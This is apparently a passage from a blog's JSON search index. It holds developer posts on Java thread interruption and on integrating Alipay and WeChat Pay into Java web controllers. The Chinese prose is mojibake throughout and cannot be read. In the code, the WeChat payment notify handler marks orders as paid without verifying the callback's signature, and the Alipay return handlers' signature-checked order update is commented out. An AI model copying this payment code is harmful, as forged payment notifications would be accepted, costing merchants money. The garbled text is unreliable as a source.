}çº¿ç¨‹ä¼šåœ¨(1000+)msåç»“æŸ,æ•´ä¸ªç¨‹åºä¹Ÿä¼šç»“æŸç¬¬äºŒç§,æœ‰sleepçš„æƒ…å†µä¸‹public static void main(String[] args) { Thread t1 = new Thread(()-&gt;{ while(true){ if (interrupted()) { break; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;i&quot; + new Date()); } }); t1.start(); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } t1.interrupt(); }æ–¹æ³•å¹¶ä¸ä¼šé€€å‡º,åªæ˜¯æ‰“å‡ºäº†ä¸€ä¸ªInterruptException ä½œè€…ï¼šå¤§é—²äººæŸ´æ¯›æ¯› é“¾æ¥ï¼šhttps://www.zhihu.com/question/41048032/answer/252905837 æ¥æºï¼šçŸ¥ä¹ è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ å¦‚ä½•å¤„ç†ä¸­æ–­ï¼Ÿä¸Šæ–‡éƒ½åœ¨ä»‹ç»å¦‚ä½•è·å–ä¸­æ–­çŠ¶æ€ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æ•è·åˆ°ä¸­æ–­çŠ¶æ€åï¼Œç©¶ç«Ÿå¦‚ä½•å¤„ç†å‘¢ï¼Ÿ *Javaç±»åº“ä¸­æä¾›çš„ä¸€äº›å¯èƒ½ä¼šå‘ç”Ÿé˜»å¡çš„æ–¹æ³•éƒ½ä¼šæŠ›InterruptedExceptionå¼‚å¸¸ï¼Œå¦‚ï¼šBlockingQueue#putã€BlockingQueue#takeã€Object#waitã€Thread#sleepã€‚ *å½“ä½ åœ¨æŸä¸€æ¡çº¿ç¨‹ä¸­è°ƒç”¨è¿™äº›æ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•å¯èƒ½ä¼šè¢«é˜»å¡å¾ˆé•¿æ—¶é—´ï¼Œä½ å¯ä»¥åœ¨åˆ«çš„çº¿ç¨‹ä¸­è°ƒç”¨å½“å‰çº¿ç¨‹å¯¹è±¡çš„interruptæ–¹æ³•è§¦å‘è¿™äº›å‡½æ•°æŠ›å‡ºInterruptedExceptionå¼‚å¸¸ã€‚ å½“ä¸€ä¸ªå‡½æ•°æŠ›å‡ºInterruptedExceptionå¼‚å¸¸æ—¶ï¼Œè¡¨ç¤ºè¿™ä¸ªæ–¹æ³•é˜»å¡çš„æ—¶é—´å¤ªä¹…äº†ï¼Œåˆ«äººä¸æƒ³ç­‰å®ƒæ‰§è¡Œç»“æŸäº†ã€‚ å½“ä½ çš„æ•è·åˆ°ä¸€ä¸ªInterruptedExceptionå¼‚å¸¸åï¼Œäº¦å¯ä»¥å¤„ç†å®ƒï¼Œæˆ–è€…å‘ä¸ŠæŠ›å‡ºã€‚ æŠ›å‡ºæ—¶è¦æ³¨æ„ï¼Ÿï¼Ÿï¼Ÿï¼šå½“ä½ æ•è·åˆ°InterruptedExceptionå¼‚å¸¸åï¼Œå½“å‰çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€å·²ç»è¢«ä¿®æ”¹ä¸ºfalse(è¡¨ç¤ºçº¿ç¨‹æœªè¢«ä¸­æ–­)ï¼›æ­¤æ—¶ä½ è‹¥èƒ½å¤Ÿå¤„ç†ä¸­æ–­ï¼Œåˆ™ä¸ç”¨ç†ä¼šè¯¥å€¼ï¼›ä½†å¦‚æœä½ ç»§ç»­å‘ä¸ŠæŠ›InterruptedExceptionå¼‚å¸¸ï¼Œä½ éœ€è¦å†æ¬¡è°ƒç”¨interruptæ–¹æ³•ï¼Œå°†å½“å‰çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€è®¾ä¸ºtrueã€‚ æ³¨æ„ï¼šç»å¯¹ä¸èƒ½â€œåæ‰ä¸­æ–­â€ï¼å³æ•è·äº†InterruptedExceptionè€Œä¸ä½œä»»ä½•å¤„ç†ã€‚è¿™æ ·è¿èƒŒäº†ä¸­æ–­æœºåˆ¶çš„è§„åˆ™ï¼Œåˆ«äººæƒ³è®©ä½ çº¿ç¨‹ä¸­æ–­ï¼Œç„¶è€Œä½ è‡ªå·±ä¸å¤„ç†ï¼Œä¹Ÿä¸å°†ä¸­æ–­è¯·æ±‚å‘Šè¯‰è°ƒç”¨è€…ï¼Œè°ƒç”¨è€…ä¸€ç›´ä»¥ä¸ºæ²¡æœ‰ä¸­æ–­è¯·æ±‚ã€‚ æ›´æ–°ç›¸å…³interruptæ–¹æ³•çš„æ„ä¹‰public void interrupt()Threadé‡Œé¢çš„æ‰“æ–­å‡½æ•°,å¯ä»¥ä½¿ç”¨æ–°å»ºä¸€ä¸ªThreadå¯¹è±¡,æ‰§è¡Œ thread.interrupt(); ä¿®æ”¹è°ƒç”¨çº¿ç¨‹çš„interrupt çš„status public static boolean interrupted()è¯¥æ–¹æ³•å¯ä»¥åˆ¤æ–­æ˜¯å¦è¢«æ‰“æ–­,ä½†æ˜¯è¿™ä¸ªinterruptçš„statusä¼šè¢«æ¸…é™¤, /** * Tests whether the current thread has been interrupted. The * &lt;i&gt;interrupted status&lt;/i&gt; of the thread is cleared by this method. In * other words, if this method were to be called twice in succession, the * second call would return false (unless the current thread were * interrupted again, after the first call had cleared its interrupted * status and before the second call had examined it). * * &lt;p&gt;A thread interruption ignored because a thread was not alive * at the time of the interrupt will be reflected by this method * returning false. * * @return &lt;code&gt;true&lt;/code&gt; if the current thread has been interrupted; * &lt;code&gt;false&lt;/code&gt; otherwise. * @see #isInterrupted() * @revised 6.0 */public boolean isInterrupted()è¯¥æ–¹æ³•å¯ä»¥åˆ¤æ–­æ˜¯å¦è¢«æ‰“æ–­","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"interrupt","slug":"interrupt","permalink":"http://yoursite.com/tags/interrupt/"}]},{"title":"æ”¯ä»˜å®H5æ”¯ä»˜","slug":"æ”¯ä»˜å®H5æ”¯ä»˜","date":"2019-01-23T08:38:17.000Z","updated":"2020-11-14T17:11:05.304Z","comments":true,"path":"2019/01/23/æ”¯ä»˜å®H5æ”¯ä»˜/","link":"","permalink":"http://yoursite.com/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/","excerpt":"","text":"æˆ‘è¿™é‡ŒæŒ‡çš„æ˜¯å¾®ä¿¡å·¥ä½œå·ä¸­æ‰“å¼€æ”¯ä»˜å®æ”¯ä»˜ æ–‡æ¡£ ä¸Šé¢æ–‡æ¡£ä¸€å®šè¦ä»”ç»†é˜…è¯» [å¿«é€Ÿæ¥å…¥]( https://docs.open.alipay.com/203/105285/ï¼‰ @RequestMapping(&quot;/alipay&quot;) public void alipay(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); orderInfoService.updateById(info); String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8); String totalAmount = info.getOrderMoney().toString(); String subject = info.getOrderProject(); //å°è£…è¯·æ±‚å®¢æˆ·ç«¯ AlipayClient client = new DefaultAlipayClient (url,app_id,private_key,format,charset, public_key,signtype ); //æ”¯ä»˜è¯·æ±‚ AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest(); alipayRequest.setReturnUrl(&quot;http://XXXX.com/xxxx/api/returnUrl?orderNumber=&quot;+orderNumber); alipayRequest.setNotifyUrl(&quot;http://xxxx.com/xxxx/api/notifyUrl&quot;); AlipayTradeWapPayModel model = new AlipayTradeWapPayModel(); model.setProductCode(&quot;QUICK_WAP_PAY&quot;); model.setOutTradeNo(orderNo); model.setSubject(subject); model.setTotalAmount(totalAmount); model.setBody(info.getOrderProject()); alipayRequest.setBizModel(model); String form = client.pageExecute(alipayRequest).getBody(); response.setContentType(&quot;text/html;charset=&quot;+charset); response.getWriter().write(form); response.getWriter().flush(); response.getWriter().close(); }è¿™é‡Œæœ‰ç‚¹åƒè€å¼çš„servletæ¸²æŸ“ç•Œé¢ è¿™é‡Œçš„å‚æ•°ï¼Œè¯·æ ¹æ®å®˜æ–¹çš„æŒ‡å¼• AlipayClient alipayClient = new DefaultAlipayClient(&quot;https://openapi.alipay.com/gateway.do&quot;, APP_ID, APP_PRIVATE_KEY, &quot;json&quot;, CHARSET, ALIPAY_PUBLIC_KEY, &quot;RSA2&quot;); //è·å¾—åˆå§‹åŒ–çš„AlipayClientç§é’¥ï¼Œå…¬é’¥ï¼Œé˜¿é‡Œå…¬é’¥ï¼Œæ ¹æ®å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œç”Ÿæˆï¼Œä¸Šé¢ä»£ç ä¸­éœ€è¦çš„æ˜¯ç§é’¥ï¼Œè¿˜æœ‰é˜¿é‡Œå…¬é’¥ AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest();AlipayTradeWapPayRequestè¿™ä¸ªç±»æ˜¯æ¸²æŸ“æ‰‹æœºç•Œé¢ï¼Œè€ŒAlipayTradePagePayRequestæ¸²æŸ“PCç«¯ model.setProductCode(&quot;QUICK_WAP_PAY&quot;);æ³¨æ„æ­¤å¤„çš„productCodeï¼Œä¸è¦å†™é”™äº† æ”¯ä»˜å®åŒæ­¥è·³è½¬/** * æ”¯ä»˜å®åŒæ­¥è·³è½¬ * */ @RequestMapping(&quot;/returnUrl&quot;) public void returnUrl(HttpServletRequest request, HttpServletResponse response) throws Exception{ String orderNumber = request.getParameter(&quot;orderNumber&quot;); // è·å–æ”¯ä»˜å®GETè¿‡æ¥åé¦ˆä¿¡æ¯ï¼ˆå®˜æ–¹å›ºå®šä»£ç ï¼‰ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } params.remove(&quot;orderNumber&quot;); //æ³¨æ„ï¼Œæˆ‘è¿™é‡Œremove mapä¸­çš„orderNumberï¼Œæ˜¯å› ä¸ºå¦‚æœåŠ å…¥orderNumberï¼Œä¸‹é¢è¿™ä¸ªå¯¹signVerifiedçš„åˆ¤æ–­ä¼šæœ‰æœ‰å°è±¡ boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); // è¿”å›ç•Œé¢ //if (signVerified) { // info.setOrderState(1); //orderInfoService.updateById(info); //} response.sendRedirect(&quot;http://m.xxxx.com/orderDetail.html?orderNum=&quot;+orderNumber); }æ”¯ä»˜å®æœåŠ¡å™¨å¼‚æ­¥é€šçŸ¥/** * æ”¯ä»˜å®æœåŠ¡å™¨å¼‚æ­¥é€šçŸ¥ * * @param request * @throws Exception */ @RequestMapping(&quot;/notifyUrl&quot;) public void notifyUrl(HttpServletRequest request, PrintWriter out) throws Exception { // è·å–æ”¯ä»˜å®GETè¿‡æ¥åé¦ˆä¿¡æ¯ Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); // è°ƒç”¨SDKéªŒè¯ç­¾å if (signVerified) { // éªŒè¯æˆåŠŸ æ›´æ–°è®¢å•ä¿¡æ¯ System.out.println(&quot;å¼‚æ­¥é€šçŸ¥æˆåŠŸ&quot;); // å•†æˆ·è®¢å•å· String out_trade_no = request.getParameter(&quot;out_trade_no&quot;); // äº¤æ˜“çŠ¶æ€ String trade_status = request.getParameter(&quot;trade_status&quot;); // ä¿®æ”¹æ•°æ®åº“ //è·å–out_trade_noï¼Œè·å–orderNumberï¼Œè¿›è¡Œä¿®æ”¹ out.println(&quot;success&quot;); out.flush(); } else { System.out.println(&quot;å¼‚æ­¥é€šçŸ¥å¤±è´¥&quot;); out.println(&quot;fail&quot;); } } è¿™é‡Œé€šçŸ¥æ”¯ä»˜å®ï¼Œæˆ‘æ”¶åˆ°äº†ï¼Œè¿”å›success è¿˜æœ‰ä¸€ä¸ªé‡è¦é—®é¢˜ï¼Œé‚£å°±æ˜¯å¾®ä¿¡å…¬ä¼—å·é‡Œé¢å¯¹æ”¯ä»˜å®æ”¯ä»˜æ˜¯æ‹¦æˆª å¾®ä¿¡å…¬ä¼—å·å¹³å°æ— æ³•ä½¿ç”¨æ”¯ä»˜å®æ”¯ä»˜çš„è§£å†³æ–¹æ¡ˆ å°†htmlæ–‡ä»¶å’Œjsæ–‡ä»¶æ”¾å…¥é¡¹ç›®ä¸­ã€‚","categories":[],"tags":[{"name":"æ”¯ä»˜","slug":"æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"æ”¯ä»˜å®H5æ”¯ä»˜","slug":"æ”¯ä»˜å®H5æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/"}]},{"title":"æ”¯ä»˜å®PCæ”¯ä»˜","slug":"æ”¯ä»˜å®PCæ”¯ä»˜","date":"2019-01-23T08:37:04.000Z","updated":"2020-11-14T17:11:05.854Z","comments":true,"path":"2019/01/23/æ”¯ä»˜å®PCæ”¯ä»˜/","link":"","permalink":"http://yoursite.com/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/","excerpt":"","text":"æ”¯ä»˜å®PCç‰ˆæ”¯ä»˜ å¼€å‘æ–‡æ¡£ @RequestMapping(&quot;/alipayPC&quot;) public void alipayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8); String totalAmount = info.getOrderMoney().toString(); String subject = info.getOrderProject(); //å°è£…è¯·æ±‚å®¢æˆ·ç«¯ AlipayClient client = new DefaultAlipayClient (url,app_id,private_key,format,charset, public_key,signtype ); //æ”¯ä»˜è¯·æ±‚ AlipayTradePagePayRequest alipayRequest = new AlipayTradePagePayRequest(); alipayRequest.setReturnUrl(&quot;http://XXXX.com/XXXX/api/returnUrlPC?orderNumber=&quot;+orderNumber); alipayRequest.setNotifyUrl(&quot;http://XXXX.com/XXXX/api/notifyUrl&quot;); AlipayTradePagePayModel model = new AlipayTradePagePayModel(); model.setProductCode(&quot;FAST_INSTANT_TRADE_PAY&quot;); model.setOutTradeNo(orderNo); model.setSubject(subject); model.setTotalAmount(totalAmount); model.setBody(info.getOrderProject()); alipayRequest.setBizModel(model); String form = client.pageExecute(alipayRequest).getBody(); response.setContentType(&quot;text/html;charset=&quot;+charset); response.getWriter().write(form); response.getWriter().flush(); response.getWriter().close(); } /** * æ”¯ä»˜å®æ”¯ä»˜åè·³è½¬ * */ @RequestMapping(&quot;/returnUrlPC&quot;) public void returnUrlPC(HttpServletResponse response,HttpServletRequest request) throws IOException, AlipayApiException { // è·å–æ”¯ä»˜å®GETè¿‡æ¥åé¦ˆä¿¡æ¯ï¼ˆå®˜æ–¹å›ºå®šä»£ç ï¼‰ String orderNumber = request.getParameter(&quot;orderNumber&quot;); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } params.remove(&quot;orderNumber&quot;); boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); System.out.println(signVerified); // if(signVerified){ // info.setOrderState(1); // orderInfoService.updateById(info); //} response.sendRedirect(&quot;http://www.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber); }æ›´æ–°æ•°æ®åº“åº”è¯¥æ˜¯notifyé‡Œé¢ä¿®æ”¹","categories":[],"tags":[{"name":"æ”¯ä»˜","slug":"æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"æ”¯ä»˜å®PCæ”¯ä»˜","slug":"æ”¯ä»˜å®PCæ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/"}]},{"title":"å¾®ä¿¡æ”¯ä»˜PC","slug":"å¾®ä¿¡æ”¯ä»˜PC","date":"2019-01-23T08:35:28.000Z","updated":"2020-11-14T17:11:06.741Z","comments":true,"path":"2019/01/23/å¾®ä¿¡æ”¯ä»˜PC/","link":"","permalink":"http://yoursite.com/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98PC/","excerpt":"","text":"PCç«¯ï¼Œä¹Ÿå°±æ˜¯Nativeæ”¯ä»˜ å¼€å‘æ–‡æ¡£ ç»Ÿä¸€ä¸‹å•api: å¿…é¡»å‚æ•° Appid,mch_id,nonce_str,sign,body,out_trade_noï¼Œtotal_fee,spbill_create_ip,notify_url,trade_type @RequestMapping(&quot;/wxpayPC&quot;) @ResponseBody public Map&lt;String, String&gt; wxpayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletResponse response, HttpServletRequest request) throws Exception { WxpayConfig wxpayConfig = new WxpayConfig(); /** * PCå¹¶ä¸éœ€è¦openId * */ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;(); paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id()); paraMap.put(&quot;body&quot;,info.getOrderProject()); paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id()); paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr()); String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;; String orderNo =randomNum+orderNumber; paraMap.put(&quot;out_trade_no&quot;,orderNo); paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip()); String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;; paraMap.put(&quot;total_fee&quot;,total_fee); paraMap.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotifyPC&quot;); String apiKey = wxpayConfig.getApi_key(); String sign = WXPayUtil.generateSignature(paraMap,apiKey); paraMap.put(&quot;sign&quot;,sign); String xml = WXPayUtil.mapToXml(paraMap); //ç»Ÿä¸€ä¸‹å• https://api.mch.weixin.qq.com/pay/unifiedorder String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;; String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false); System.out.println(xmlStr); //ä»¥ä¸‹å†…å®¹æ˜¯è¿”å›å‰ç«¯é¡µé¢çš„jsonæ•°æ® String prepay_id = &quot;&quot;;//é¢„æ”¯ä»˜id String code_url = &quot;&quot;; if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) { Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr); prepay_id = (String) map.get(&quot;prepay_id&quot;); code_url = (String)map.get(&quot;code_url&quot;); } Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;(); payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id()); payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;); payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr()); payMap.put(&quot;signType&quot;, &quot;MD5&quot;); payMap.put(&quot;code_url&quot;,code_url);//å°†code_urlè¿”å›ç»™å‰å° payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id); String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key()); payMap.put(&quot;paySign&quot;, paySign); return payMap; }å°†æ•°æ®å‘é€ç»™https://api.mch.weixin.qq.com/pay/unifiedorderï¼Œä½ å¯ä»¥åˆ¤æ–­è¿”å›æ˜¯å¦æˆåŠŸï¼ŒæˆåŠŸæ—¶å€™æœ‰ä¸€ä¸ªcode_url,ä¹Ÿå°±æ˜¯äºŒç»´ç çš„urlã€‚ ä¸€èˆ¬æ ¼å¼weixin://wxpay/bizpayurl?pr=ByrALdk ç”ŸæˆäºŒç»´ç ï¼Œå¯ä»¥è°ƒç”¨qrcode.jsåº“ æ•™ç¨‹ new QRCode(document.getElementById(&quot;qrcode&quot;), &quot;weixin://wxpay/bizpayurl?pr=ByrALdk&quot;);è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¼šç”Ÿæˆæ”¯ä»˜äºŒç»´ç  åå°å›è°ƒæ–¹æ³• è·å–ä¿¡æ¯ æˆåŠŸåï¼Œä¿®æ”¹è®¢å•çŠ¶æ€ï¼Œè¿”å›successç»™å¾®ä¿¡ @RequestMapping(&quot;/wxnotifyPC&quot;) public String wxnotifyPC(HttpServletRequest request,HttpServletResponse response){ InputStream is = null; try{ is = request.getInputStream(); String xml = WXPayUtil.inputStream2String(is); Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml); String orderNumber = &quot;&quot;; if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) { orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); info.setOrderState(1); orderInfoService.updateById(info); String amount = notifyMap.get(&quot;total_fee&quot;); System.out.println(&quot;å®é™…ä»˜æ¬¾ï¼š&quot;+amount); } response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;); is.close(); } catch (Exception e) { e.printStackTrace(); } return null; }æ€è€ƒï¼Œå‰å° å‰å°ï¼Œåœ¨æ‰«ç åå¦‚ä½•è·³è½¬æ”¯ä»˜é¡µé¢ï¼Œå› ä¸ºäºŒç»´ç å‡ºç°åï¼Œæˆ‘å¹¶ä¸çŸ¥é“è¿™ä¸ªäºŒç»´ç æ˜¯å¦è¢«æ‰‹æœºæ‰«ç ï¼Œæ‰€ä»¥æˆ‘åœ¨è¿™ä¸ªæ‰«ç ç•Œé¢ è®¾ç½®äº†å®šæ—¶å™¨1ï¼ŒäºŒç»´ç ç”Ÿæˆåã€‚1ç§’æ‰§è¡ŒæŸ¥è¯¢çš„ajaxï¼Œå¯¹è¿™ä¸ªorderæŸ¥è¯¢æ˜¯å¦æˆåŠŸï¼Œå¦‚æœæˆåŠŸï¼Œè¿”å›è®¢å•ç•Œé¢ã€‚ å®šæ—¶å™¨2ï¼Œ1å°æ—¶åˆ·æ–°äºŒç»´ç ï¼Œå¦‚æœè¿™ä¸ªç”¨æˆ·åœç•™åœ¨è¿™ä¸ªç•Œé¢ï¼Œé˜²æ­¢äºŒç»´ç å¤±æ•ˆ","categories":[],"tags":[{"name":"æ”¯ä»˜","slug":"æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"å¾®ä¿¡æ”¯ä»˜","slug":"å¾®ä¿¡æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98/"},{"name":"NATIVE","slug":"NATIVE","permalink":"http://yoursite.com/tags/NATIVE/"}]},{"title":"å¾®ä¿¡æ”¯ä»˜jsapi","slug":"å¾®ä¿¡æ”¯ä»˜jsapi","date":"2019-01-23T08:28:32.000Z","updated":"2020-11-14T17:11:08.124Z","comments":true,"path":"2019/01/23/å¾®ä¿¡æ”¯ä»˜jsapi/","link":"","permalink":"http://yoursite.com/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98jsapi/","excerpt":"","text":"å¾®ä¿¡æ”¯ä»˜jsapiå•†æˆ·å·²æœ‰H5å•†åŸç½‘ç«™ï¼Œç”¨æˆ·é€šè¿‡æ¶ˆæ¯æˆ–æ‰«æäºŒç»´ç åœ¨å¾®ä¿¡å†…æ‰“å¼€ç½‘é¡µæ—¶ï¼Œå¯ä»¥è°ƒç”¨å¾®ä¿¡æ”¯ä»˜å®Œæˆä¸‹å•è´­ä¹°çš„æµç¨‹ã€‚ å¼€å‘æ­¥éª¤ æŠ€æœ¯åšå®¢ jspiæ”¯ä»˜ï¼Œæ˜¯æŒ‡å¾®ä¿¡å…¬ä¼—å·é‡Œé¢çš„æ‰“å¼€ç½‘ç«™ï¼Œæ”¯ä»˜å¤§è‡´æµç¨‹ è·å–æ‰€éœ€å‚æ•° å‘é€ç»™ç»Ÿä¸€ä¸‹å•çš„æ¥å£ æ ¹æ®è¿”å›çš„å‚æ•°ï¼Œè¿›è¡Œè§£æï¼Œå¦‚æœæˆåŠŸï¼Œå°†éƒ¨åˆ†å‚æ•°å‘é€ç»™å‰å°ã€‚æ³¨æ„å‰å°çš„æµè§ˆå™¨æ˜¯å¾®ä¿¡å†…ç½®æµè§ˆå™¨ï¼Œæœ‰ä¸€ä¸ªå†…ç½®çš„jså¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡jså¯¹è±¡ï¼Œè°ƒèµ·æ”¯ä»˜ æœ€åè·³è½¬åˆ°ç»“æœé¡µé¢ æ­£å¼å¼€å‘ jsapiç»Ÿä¸€ä¸‹å•apiåˆ—è¡¨ä¸‹é¢åˆ—ä¸¾å¿…é¡»å­—æ®µ Appid,mch_id,nonce_str,sign,body,out_trade_no,total_fee,spbill_create_ip,notify_url,trade_type,openid æ³¨æ„ï¼š total_feeæ˜¯åˆ†ä¸ºå•ä½ String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;;è¯´ä¸‹ä¸å¥½è·å–çš„ spbill_create_ip :æˆ‘å½“æ—¶å°±æ˜¯å†™äº†127.0.0.1ï¼Œæˆ‘å¹¶ä¸æ¸…æ¥šæ€ä¹ˆè·å– notify_url :å†™å…¬ç½‘å¯ä»¥è®¿é—®çš„åœ°å€ï¼Œæœ€å¥½å»çœ‹ä¸‹å®˜ç½‘çš„ä»‹ç»ï¼Œ out_trade_no :å‰6ä½æ˜¯éšæœºæ•°ï¼Œåé¢æ˜¯æ•°æ®åº“ä¸­å®é™…çš„è®¢å•ç¼–å·ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å›è°ƒçš„æ—¶å€™è·å–è®¢å•ç¼–å·ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ«çš„æ–¹æ³•ã€‚ openid :æ˜¯æŒ‡ä¸€ä¸ªç”¨æˆ·åˆ°ä¸€ä¸ªå…¬ä¼—å·ï¼Œå¯¹åº”çš„ä¸€ä¸ªkeyï¼Œæ˜¯å”¯ä¸€çš„ï¼Œè·å–æ–¹æ³• æ–‡æ¡£ æˆ‘çš„æ€è·¯æ˜¯ï¼Œå…ˆè·å–codeï¼ŒH5ç•Œé¢é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªå»æ”¯ä»˜æŒ‰é’®ï¼Œè€Œå»æ”¯ä»˜æŒ‰é’®æ˜¯ä¸€ä¸ªè¶…é“¾æ¥ https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx1111111111111111&amp;redirect_uri=http%3A%2F%2Fm.XXXX.com%2FpayList.html%3ForderNumber%3D&quot;+orderNum+&quot;&amp;response_type=code&amp;scope=snsapi_base&amp;state=123#wechat_redirect&quot;;è¿™é‡Œé¢çš„redirect_uriéœ€è¦æ ¼å¼åŒ– import java.net.URLEncoder; String formatUrl = URLEncoder.encode(&quot;http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&quot;,&quot;UTF_8&quot;);è·³è½¬å›æ¥çš„æ—¶å€™æ˜¯ http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&amp;code=sdhjsdhfjhasjhfhjasdhbavbnbè¿™ä¸ªcodeå‘¢ï¼Œä½ å¼€å‘åœ¨ç”µè„‘ç«¯æ˜¯çœ‹ä¸è§çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯å¾®ä¿¡å‘çš„åœ°æ–¹ï¼Œæ‰€ä»¥ä½  